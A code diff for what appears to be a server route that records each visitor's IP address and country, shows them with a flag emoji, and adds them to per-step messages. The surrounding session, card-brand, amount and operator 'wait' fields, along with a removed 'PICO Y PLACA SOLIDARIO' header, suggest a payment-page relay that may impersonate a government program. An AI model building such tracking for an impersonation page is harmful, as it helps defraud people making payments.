@@ -262,13 +262,38 @@ function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, 
   return '-';
 }
 
+function countryFlag(code: string) {
+  const cc = String(code || '').trim().toUpperCase();
+  if (!/^[A-Z]{2}$/.test(cc)) return '';
+  return Array.from(cc).map((ch) => String.fromCodePoint(127397 + ch.charCodeAt(0))).join('');
+}
+
+function clientIp(request: Request) {
+  const forwarded = request.headers.get('x-forwarded-for') || request.headers.get('x-vercel-forwarded-for') || '';
+  const first = forwarded.split(',')[0].trim();
+  return first
+    || request.headers.get('x-real-ip')
+    || request.headers.get('cf-connecting-ip')
+    || request.headers.get('x-vercel-ip')
+    || '';
+}
+
+function clientCountry(request: Request) {
+  return (
+    request.headers.get('x-vercel-ip-country')
+    || request.headers.get('cf-ipcountry')
+    || request.headers.get('x-country-code')
+    || ''
+  ).trim().toUpperCase();
+}
+
 function formatStepMessage(payload: Record<string, unknown>) {
   const meta = objectValue(payload.meta) || {};
+  const ip = String(payload.ip || meta.ip || '').trim() || '-';
+  const flag = countryFlag(String(payload.country || meta.country || ''));
   return [
-    '🌿 PICO Y PLACA SOLIDARIO',
-    '━━━━━━━━━━━━━━━━━━',
     `📍 ${stepLabel(payload.event, meta)}`,
-    '━━━━━━━━━━━━━━━━━━',
+    [flag, ip].filter(Boolean).join(' '),
   ].join('\n');
 }
 
@@ -576,12 +601,18 @@ export const POST: APIRoute = async ({ request }) => {
     await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
 
+  const ip = clientIp(request);
+  const country = clientCountry(request);
   const meta = keepFilled(previousMeta, incomingMeta);
+  if (ip) meta.ip = ip;
+  if (country) meta.country = country;
   const payload = {
     sessionId,
     event,
     route: String(body.route || ''),
     createdAt: new Date().toISOString(),
+    ip: ip || previousMeta?.ip || '',
+    country: country || previousMeta?.country || '',
     brand,
     amount: meta.amount ?? previousMeta?.amount,
     amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
